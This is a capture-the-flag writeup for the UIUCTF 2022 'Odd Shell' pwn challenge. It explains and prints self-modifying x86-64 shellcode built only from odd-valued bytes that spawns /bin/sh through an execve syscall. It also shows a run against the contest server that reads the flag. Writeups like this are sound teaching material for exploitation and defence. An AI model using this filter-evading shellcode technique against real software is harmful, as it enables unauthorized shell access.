# UIUCTF 2022 - Odd Shell Writeup
- Type - pwn
- Name - Odd Shell
- Points - 107

## Description
```markdown
O ho! You found me! I have a display of oddities available to you!

$ nc odd-shell.chal.uiuc.tf 1337

author: Surg
```

## Writeup
I decided to spawn a shell using the `syscall` approach (see the entry for `execve` in the [Linux System Call Table](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) to see how I had to set registers). I used an [online x86/6x assembler](https://defuse.ca/online-x86-assembler.htm#disassembly) to test my assembly commands and ensure they were all odd. Since some important instructions were only even, I took a dynamic approach, where I had the instructions change future instructions.

For example, if I wanted the instruction `xor rsi,rsi` to zero out the `rsi` register, the assembly would be `48 31 f6`. Since both `48` and `f6` were even, I modified them to odd instructions (`xor r13d,r14d`, which was `45 31 f5`), and then wrote instructions that added 3 to 45 and 1 to f6. This transformed `xor r13d,r14d` to `xor rsi,rsi`, then ran the instruction. I also stored the string `/bin/sh` at the beginning of the memory address provided for our shellcode, and copied that address from the `rdx` register. Register 15 (`r15`) was my main scratch register. 

Shellcode:
```assembly
### PUT "/bin/sh" AT BEGINNING OF INSTRUCTIONS ###
# move address for instruction start to r15
mov   r15,rdx

# create "nib/" (0x6d69612f) in rcx, then move to r15
mov   ecx,0x010d31b1
imul  ecx,ecx,0x69
add   ecx,0x7f
add   ecx,0x17
mov   DWORD PTR[r15],ecx

# shift r15 by 4 for next part of string
add   r15,3
add   r15,1

# create "\x00hs/" (0x0068732F) in rcx, then move to r15
mov   ecx,0x016973b5
sub   ecx,0x01010101
add   ecx,0x7b
mov   DWORD PTR[r15],ecx


### MOVE $rdx into $rdi ###
mov    r15,rdx
add    r15,0x3b
add    r15,0x1
add    DWORD PTR[r15],0x3
mov    r15d,r10d


### PUT 0 INTO $rsi ###
# add 3 to first part of XOR
mov    r15,rdx
add    r15,0x55
add    DWORD PTR[r15],0x3

# add 1 to third part of XOR
mov    r15,rdx
add    r15,0x57
add    DWORD PTR[r15],0x1

xor    r13d,r14d          # (45 31 f5) --> xor rsi,rsi (48 31 f6)


### PUT 0 INTO $rdx ###
# add 3 to first part of XOR
mov    r15,rdx
add    r15,0x75
add    r15,0x1
add    DWORD PTR[r15],0x3

# add 1 to third part of XOR
mov    r15,rdx
add    r15,0x77
add    r15,0x1
add    DWORD PTR[r15],0x1

xor    r9d,r10d          # (45 31 d1) --> xor rdx,rdx (48 31 d2)


### PUT 59 INTO $rax ###
# random instruction for offset
xor    r13,r13

# add 7 to first part of XOR
mov    r15,rdi
add    r15,0x7f
add    r15,0x1b
add    DWORD PTR[r15],0x7

# subtract 1 from third part of XOR
mov    r15,rdi
add    r15,0x7f
add    r15,0x1d
sub    DWORD PTR[r15],0x1

add    r9d,0x3b          # (41 83 c1 3b) --> add rax,0x3b (48 83 c0 3b)


### SYSCALL ###
syscall
```

I then put this shellcode into a Python script with pwntools ([odd.py](odd.py)) and ran it! Results:

```bash
$ python3 odd.py REMOTE
[+] Opening connection to odd-shell.chal.uiuc.tf on port 1337: Done
[*] Switching to interactive mode
Display your oddities:
$ whoami
user
$ cat /flag
uiuctf{5uch_0dd_by4t3s_1n_my_r3g1st3rs!}
$
[*] Closed connection to odd-shell.chal.uiuc.tf port 1337
```

**Flag:** `uiuctf{5uch_0dd_by4t3s_1n_my_r3g1st3rs!}`